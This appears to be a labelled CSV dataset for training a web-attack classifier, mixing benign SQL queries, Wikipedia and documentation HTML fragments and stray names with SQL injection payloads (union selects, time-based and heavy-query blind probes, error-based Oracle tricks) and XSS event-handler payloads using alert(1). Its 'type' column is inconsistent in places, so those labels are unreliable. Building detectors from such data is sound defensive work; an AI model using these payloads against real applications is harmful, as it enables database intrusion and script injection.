Text,Label,type
"INSERT INTO driven ( your, country, welcome, popular, salt, wherever )  VALUES  ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )  ",0,xss
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"   SELECT COUNT ( ran ) , monkey FROM operation BY cast",0,sql
select   (  case when   (  1014  =  4280  )   then 1014 else 1014*  (  select 1014 from mysql.db  )   end  )  #,1,sql
</ul>,0,xss
"<ul><li><a href=""/wiki/Abstract_and_concrete"" title=""Abstract and concrete"">Abstract object </a> </li>",0,xss
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0,sql
-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun,1,sql
belalczar,0,sql
"<time draggable=""true"" ondragleave=""alert(1)"">test</time>",2,xss
1'   )    )    rlike   (  select   (  case when   (  3876  =  2077  )   then 1 else 0x28 end   )    )    and    (    (   'hqcz' like 'hqcz,1,sql
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'yqmv'  =  'yqmv",1,sql
"<optgroup onpaste=""alert(1)"" contenteditable>test</optgroup>",2,xss
"coslada 83, 4g",0,xss
SELECT TOP 3 * FROM swing WHERE crew = 'feed',0,xss
SELECT earn ( s )  FROM circle UNION ALL,0,xss
"<li><cite id=""CITEREFMcCorduck2004"" class=""citation""><a href=""/wiki/Pamela_McCorduck"" title=""Pamela McCorduck"">McCorduck, Pamela </a> (2004), <a rel=""nofollow"" class=""external text"" href=""http://www.pamelamc.com/html/machines_who_think.html""><i>Machines Who Think </i> </a> (2nd ed.), Natick, MA: A. K. Peters, Ltd., <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/1-56881-205-1"" title=""Special:BookSources/1-56881-205-1""><bdi>1-56881-205-1 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Machines+Who+Think&amp;rft.place=Natick%2C+MA&amp;rft.edition=2nd&amp;rft.pub=A.+K.+Peters%2C+Ltd.&amp;rft.date=2004&amp;rft.isbn=1-56881-205-1&amp;rft.aulast=McCorduck&amp;rft.aufirst=Pamela&amp;rft_id=http%3A%2F%2Fwww.pamelamc.com%2Fhtml%2Fmachines_who_think.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
 </p>,0,xss
"<li id=""cite_note-AI_at_Edinburgh_and_France_in_the_60s-162""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Edinburgh_and_France_in_the_60s_162-0"">^ </a> </b> ",0,xss
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,sql
"<li id=""cite_note-48""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-48"">^ </a> </b> ",0,xss
	 <div> </div> </td> </tr> </tbody> </table>,0,xss
"1""  )   as vdim where 1296  =  1296",1,sql
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,xss
SELECT * FROM numeral FETCH FIRST 3 ROWS ONLY,0,sql
"<dt><a class=""reference internal"" href=""topics/telnetconsole.html""><span class=""doc"">Telnet Console",0,xss
select   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  select 5163 from master..sysdatabases  )   end  )  --,1,sql
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation',0,xss
SELECT stronger ( s )  FROM cause UNION,0,sql
-9005 union all select 4410#,1,sql
qu.8ncen3rio,0,xss
SELECT * FROM dot WHERE broken = 'mine' FETCH FIRST 3 ROWS ONLY,0,sql
"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>",2,xss
	 </span>,0,xss
"<input onclick=""alert(1)"">test</input>",2,xss
"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",1,sql
"<style>:target {transform: rotate(180deg);}</style><meter id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></meter>",2,xss
<input2 onpointerout=alert(1)>XSS</input2>,2,xss
-6233'  )   where 9820  =  9820 or 3038  =  3038,1,xss
"<cite draggable=""true"" ondragleave=""alert(1)"">test</cite>",2,xss
"<br oncontextmenu=""alert(1)"">test</br>",2,xss
SELECT MIN ( cover )  AS rose FROM common,0,sql
cote suengas,0,sql
"<marquee onclick=""alert(1)"">test</marquee>",2,xss
1.93755E+15,0,sql
javascript:alert(''),2,xss
1'||  (  select 'ymre' where 8681  =  8681,1,xss
"   SELECT support, our+ ', ' + political+ ' ' + fierce+ ', ' + shallow AS far  FROM again",0,xss
"   SELECT do, happily, did FROM light WHERE freedom  IS NULL",0,xss
"<li><a href=""/wiki/Margaret_Boden"" title=""Margaret Boden"">Boden, Margaret </a>, <i>Mind As Machine </i>, <a href=""/wiki/Oxford_University_Press"" title=""Oxford University Press"">Oxford University Press </a>, 2006. </li>",0,xss
"-5231%"" or 4945  =  8402#",1,sql
"	 </span> </a>&#32;<span class=""metadata""> &#8211; <a href=""/wiki/Talk:Artificial_intelligence#Dubious"" title=""Talk:Artificial intelligence"">discuss </a> ",0,xss
"<ul><li><a href=""/wiki/Nick_Bostrom"" title=""Nick Bostrom"">Nick Bostrom </a> </li>",0,xss
"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",2,xss
"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,xss
"<ul><li><a href=""/wiki/Space_probe"" title=""Space probe"">Space probe </a> </li> </ul> </li>",0,xss
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'uwrm'  =  'uwrm",1,sql
"c/ ricardo gutierrez 26, 8-d",0,sql
dipscea,0,sql
"<li draggable=""true"" ondrag=""alert(1)"">test</li>",2,xss
"INSERT INTO automobile  ( soldier, best, clean )  VALUES  ( 'struck', 'program', 'greatly' )  ",0,sql
"<spacer onmouseout=""alert(1)"">test</spacer>",2,xss
1 and 2006  =  2006,1,sql
SELECT * FROM review WHERE torn IN  ( SELECT service FROM invented ) ,0,xss
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",2,xss
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1,sql
document.write(),2,xss
SELECT bright ( s )  FROM nation UNION,0,sql
"<ul><li><a href=""#CITEREFNewellSimon1976"">Newell &amp; Simon 1976 </a>, p.&#160;116 </li>",0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/shell.html"">Scrapy shell</a></li>",0,xss
"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,1,xss
"calle tajo, 182,",0,sql
SELECT * FROM for  WHERE angry = answer,0,sql
SELECT coffee ( s )  FROM neighborhood UNION ALL,0,sql
	 </span> 2014 ,0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"<IMG SRC=""jav&#x0A;ascript:alert('');"">",2,xss
"<section ondblclick=""alert(1)"">test</section>",2,xss
SELECT these ( s )  FROM within UNION,0,xss
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,1,sql
"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",1,sql
6653,0,sql
"<code oncut=""alert(1)"" contenteditable>test</code>",2,xss
-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,sql
 or 'text'   =   n'text',1,sql
"<li><a href=""/wiki/Viv_(software)"" title=""Viv (software)"">Viv </a><span class=""nowrap"">&#160; ",0,xss
"<h4><span class=""mw-headline"" id=""Decrease_in_demand_for_human_labor"">Decrease in demand for human labor ",0,xss
goble,0,sql
"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",1,sql
"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sql
"  SELECT TRUNCATE ( 135.375, 2 ) ;",0,sql
"   SELECT spin, truth, cotton FROM struggle WHERE whether  IS NULL",0,xss
"<ul><li><a href=""/wiki/Allen_Institute_for_Artificial_Intelligence"" class=""mw-redirect"" title=""Allen Institute for Artificial Intelligence"">Allen Institute for Artificial Intelligence </a> </li>",0,xss
"<tt onbeforepaste=""alert(1)"" contenteditable>test</tt>",2,xss
SELECT colony ( s )  FROM halfway UNION ALL,0,xss
"	 <div class=""mbox-text-span"">This section <b>needs additional citations for <a href=""/wiki/Wikipedia:Verifiability"" title=""Wikipedia:Verifiability"">verification </a> </b>.<span class=""hide-when-compact""> Please help <a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Artificial_intelligence&amp;action=edit"">improve this article </a> by <a href=""/wiki/Help:Introduction_to_referencing_with_Wiki_Markup/1"" title=""Help:Introduction to referencing with Wiki Markup/1"">adding citations to reliable sources </a>. Unsourced material may be challenged and removed.<br /><small><span class=""plainlinks""><i>Find sources: </i>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.google.com/search?as_eq=wikipedia&amp;q=%22Artificial+intelligence%22"">""Artificial intelligence"" </a>&#160;–&#160;<a rel=""nofollow"" class=""external text"" href=""//www.google.com/search?tbm=nws&amp;q=%22Artificial+intelligence%22+-wikipedia"">news </a>&#160;<b>· </b> <a rel=""nofollow"" class=""external text"" href=""//www.google.com/search?&amp;q=%22Artificial+intelligence%22+site:news.google.com/newspapers&amp;source=newspapers"">newspapers </a>&#160;<b>· </b> <a rel=""nofollow"" class=""external text"" href=""//www.google.com/search?tbs=bks:1&amp;q=%22Artificial+intelligence%22+-wikipedia"">books </a>&#160;<b>· </b> <a rel=""nofollow"" class=""external text"" href=""//scholar.google.com/scholar?q=%22Artificial+intelligence%22"">scholar </a>&#160;<b>· </b> <a rel=""nofollow"" class=""external text"" href=""https://www.jstor.org/action/doBasicSearch?Query=%22Artificial+intelligence%22&amp;acc=on&amp;wc=on"">JSTOR </a> ",0,xss
"-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr",1,sql
2.24329E+15,0,sql
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",2,xss
SELECT team ( s FROM though RIGHT JOIN,0,sql
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",2,xss
"<aside onmousemove=""alert(1)"">test</aside>",2,xss
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,sql
-2806'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'rxzr'  =  'rxzr,1,xss
"<option onbeforecut=""alert(1)"" contenteditable>test</option>",2,xss
"<thead oncut=""alert(1)"" contenteditable>test</thead>",2,xss
SELECT * FROM simple 3 SELECT * FROM outer,0,sql
<details onpointerenter=alert(1)>XSS</details>,2,xss
"<li id=""cite_note-154""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-154"">^ </a> </b> ",0,xss
"1'||  (  select 'ufgs' where 9670  =  9670 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1,sql
SELECT real ( s FROM great RIGHT JOIN,0,xss
rogan-darrieux@rocofer.tc,0,sql
"	<span class=""mw-editsection-bracket"">[ ",0,xss
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,sql
SELECT COUNT ( equal ) FROM suppose,0,xss
SELECT AVG ( production ) FROM list SELECT SUM ( wooden ) ,0,sql
	 </span></a>.</dd>,0,xss
"<li><a href=""/wiki/Logic_in_computer_science"" title=""Logic in computer science"">Logic </a> </li>",0,xss
"  SELECT Orders.pigrID, Employees.shirt, Employees.already FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.hornID ORDER BY Orders.goldID",0,xss
"<s onmouseover=""alert(1)"">test</s>",2,xss
santa eulalia de gllego,0,sql
"<dt><a class=""reference internal"" href=""topics/media-pipeline.html""><span class=""doc"">Downloading and processing files and images",0,xss
SELECT * FROM aid WHERE    NOT wealth = 'long',0,xss
SELECT * FROM pony WHERE perhaps = 'ship' FETCH FIRST 3 ROWS ONLY,0,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk from artificial general intelligence </a> </div>",0,xss
<meta onpointerdown=alert(1)>XSS</meta>,2,xss
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",2,xss
8708,0,xss
4.03E+15,0,sql
SELECT column_name FROM table1 INNER JOIN table2 ON table1.column_name  =  table2.column_name ;,0,xss
"<data onclick=""alert(1)"">test</data>",2,xss
SELECT * FROM chest WHERE room = 'completely' FETCH FIRST 3 ROWS ONLY,0,sql
DELETE FROM behavior WHERE brain = 'unhappy',0,sql
beal,0,xss
SELECT animal FROM first,0,sql
SELECT * FROM only WHERE try = 'title'  OR made = 'type',0,sql
	 </span></a></dt><dd>Learn about the command-line tool used to manage your Scrapy project.</dd>,0,xss
	 </span>,0,xss
18995930t,0,sql
"1' where 2373  =  2373 union all select null,null#",1,sql
"  SELECT * FROM setting WHERE struck IN  ( 'drink', 'giving', 'temperature' )  ",0,xss
"      <div class=""wy-side-scroll"">",0,xss
1  )   where 9860  =  9860 and 4443  =  4111--,1,xss
sedero,0,sql
"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",2,xss
SELECT ever ( s )  FROM saved SELECT differ FROM present,0,sql
morn de almazn,0,sql
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,xss
"1%""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""%""  =  """,1,sql
"1' union all select null,null,null,null,null,null#",1,sql
"<style>:target {color: red;}</style><progress id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></progress>",2,xss
   ( SELECT ProductID   FROM OrderDetails   WHERE Quantity  =  10 ) ;,0,sql
"1""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1,sql
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,sql
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,1,sql
" SELECT * FROM frozen ORDER BY over, former",0,sql
-2022   )    )     )   or 6812  =  3516 and    (    (     (  3896  =  3896,1,sql
lafferty,0,xss
pradeep,0,sql
</ul>    ,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
 UPDATE stretch SET learn = 'sink'WHERE stared = 'temperature',0,xss
"  SELECT slightID AS ID, angle AS daughter FROM saved",0,sql
1'   )    )    as dckd where 1794  =  1794,1,sql
SELECT run ( s )  FROM moment UNION,0,sql
"<header onmouseup=""alert(1)"">test</header>",2,xss
re681g48rdia,0,sql
"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",2,xss
SELECT though ( s )  FROM opposite SELECT sure FROM younger,0,xss
<a onpointerup=alert(1)>XSS</a>,2,xss
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  3343  =  3343",1,xss
-4669  )   or 2452  =  1601#,1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">See also: <a href=""/wiki/Mass_surveillance_in_China"" title=""Mass surveillance in China"">Mass surveillance in China </a> </div>",0,xss
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0,xss
SELECT * FROM grow WHERE silence IN  ( SELECT jump FROM log ) ,0,sql
SELECT * FROM expression WHERE accurate BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<samp onkeypress=""alert(1)"" contenteditable>test</samp>",2,xss
9.84215E+15,0,sql
warriner,0,sql
SELECT part ( s )  FROM found,0,sql
63eb2ya,0,xss
"<div draggable=""true"" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>",2,xss
